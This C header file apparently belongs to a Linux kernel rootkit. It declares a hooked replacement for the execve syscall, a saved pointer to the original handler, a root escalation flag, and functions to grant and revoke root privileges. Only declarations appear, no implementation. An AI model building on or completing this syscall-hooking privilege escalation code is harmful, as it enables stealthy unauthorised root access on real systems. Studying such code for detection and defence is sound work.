#ifndef S_ESC_H
#define S_ESC_H

#include "utils.h"

/* set root escalation flag */
extern int sys_esc_flag;

/* function pointer to default execve syscall */
extern asmlinkage int (*def_execve) (const char *filename, const char *const argv[], const char *const envp[]);

asmlinkage int khook_execve(const char *filename, const char *const argv[], const char *const envp[]);
void do_priv_esc(void);
void undo_priv_esc(void);

#endif
